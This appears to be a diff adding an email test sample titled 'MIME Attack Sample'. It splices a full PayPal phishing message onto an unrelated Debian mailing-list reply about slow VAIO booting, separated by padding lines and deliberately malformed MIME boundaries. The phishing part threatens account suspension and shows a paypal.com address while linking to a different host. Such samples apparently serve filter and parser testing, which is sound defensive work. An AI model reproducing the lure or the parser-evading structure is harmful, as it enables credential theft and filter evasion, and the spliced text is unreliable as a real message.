@@ -1,0 +1,117 @@
+From: faretracker_020273@expedia.customer-email.com
+To: marihayes@hotmail.com
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20090327172434.9023B131F6FC@mail1.monkey.org>
+To: undisclosed-recipients:;
+Content-Length: 1480
+Lines: 32
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 1020
+
+<html><body>
+<table width="700" cellspacing="0" cellpadding="0">
+<img src="https://www.paypal.com/en_US/i/logo/paypal_logo.gif" border=0><br><br>
+<font face=Verdana size=2>Dear valued PayPal member,<br><br>
+
+	It has come to our attention that your PayPal account information needs to be 
+	updated as part of our continuing commitment to protect your account and to 
+	reduce the instance of fraud on our website. If you could please take 5-10 minutes 
+	out of your online experience and update your personal records you will not run into 
+	any future problems with the online service.<br><br>
+
+	However, failure to update your records will result in account suspension. 
+	Please update your records on or before 
+
+<font color=red>March 26</font>, <font color=red>2009</font>.<br><br>
+
+	Once you have updated your account records, your PayPal session will not be 
+	interrupted and will continue as normal.<br><br><br>
+	&nbsp;
+	To update your PayPal records click on the following link:<br>
+	&nbsp;
+
+<a href="http://gh1i.com/onlinelogin/us/webscr.htm?cmd=_login-run" target=_blank>http://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a><br><br><br>
+	Thank You.<br>
+	PayPal Update Team<br><br>
+
+	Accounts Management As outlined in our User Agreement, PayPal will 
+	periodically send you information about site changes and enhancements.<br><br><br>
+
+	<center><font color="#777777" size=2>Copyright  1999-2007 PayPal. All rights reserved.</font></center>
+
+</table></font></body></html>
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+Content-Type: text/plain
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+On 04/29/2007 05:27 AM, Preben Randhol wrote:
+> Hi
+> 
+> We are noticing that a new Vaio laptop is extremely slow to boot
+> Debian. We thought it was PCMCIA problem an started without it, but it
+> still is slow from around the place that PCMCIA would have started.
+> Also the X11 is very sluggish. The laptop is noticeably slower than
+> other older desktop computers. 
+> 
+> Does anybody have any experience with this? We are looking for clue as
+> to what makes this happen. Windows XP does not have a boot problem.
+> 
+> Any hints much appreciated!
+
+	On a few VAIOs you should turn off apic and lapic.
+
+	<kernel-boot-line> noapic nolapic
+
+
+
+> Preben
+
+	Kind regards,
+
+- --
+Felipe Augusto van de Wiel (faw)
+"Debian. Freedom to code. Code to freedom!"
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGNQWNCjAO0JDlykYRAuePAJ9qLmjhFFZ0r3wQHejQU6zSt8JIIwCfWviH
+r7aeicIpphnI2iFG2MGqmxo=
+=7LZt
+-----END PGP SIGNATURE-----
+-BOUNDARY--
